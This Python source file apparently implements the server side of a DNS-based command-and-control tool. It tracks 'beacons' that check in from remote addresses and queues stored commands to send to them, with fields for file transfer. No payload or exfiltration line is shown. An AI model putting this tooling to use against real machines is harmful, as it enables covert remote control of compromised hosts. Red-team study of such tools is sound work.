"""
    File containing classes and functions to create
    the DNS server and handle queries/repsonses
    @author Dosh, JRoc
"""
import socket, threading, sys, sqlite3, time, zlib
import query, beacon

"""
    Class to represent the base of the DNS server

    port - the port number to bind to
"""
class Server:
    """
        Initializes a new Server object

        port - the port for the server to listen on
        
    """
    def __init__(self, port):
        self.port= port
        self.sock = None
        self.db = None
        self.commands = []
        self.beacons = []
        self.f = False
        self.fName = None
        self.fSize = 0
        self.sendAll = False    # send to all beacons
        self.bList = []         # list of specific beacons
    """
        Function to start the server with the information
        in the server

    """
    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('', self.port))
        
        while True:
            #Accept query and start a new thread
            q, addr = self.sock.recvfrom(8192)
            query_handler = threading.Thread(target=query.handle_query, args=(q, addr, self))
            query_handler.daemon=True
            try:
                query_handler.start()
            except (KeyboardInterrupt, SystemExit):
                self.sock.close()
                sys.exit()

    """
        Function to add a new command to the servers database
        that the user can later load to send to client

        name - the variable name of the command
        cmd - the command to be sent to the client
    """
    def add_command(self, name, cmd, db):
        c = db.cursor()
        c.execute("INSERT INTO commands VALUES (?, ?)", (name, cmd))
        db.commit()
        return db 

    """
        Function to load a command into the server that the user made
        or a prepared command

        name - the name of the command to load
    """
    def load_command(self, name, db):
        c = db.cursor()
        c.execute("SELECT cmd from commands WHERE name=?", (name,))
        for cmd in c.fetchall(): self.commands += [str(cmd[0])]

    """
        Function to add a new beacon to the servers list of active beacons

        addr - the ip addr the beacon signalled from 
    """
    def add_beacon(self, addr):
        t= time.localtime()
        strtime = (str(t.tm_hour), str(t.tm_min), str(t.tm_sec))
        strtime = ":".join(strtime) 
        newB = beacon.Beacon(addr, 0, strtime, (t.tm_hour, t.tm_min, t.tm_sec))
        self.beacons += [newB]
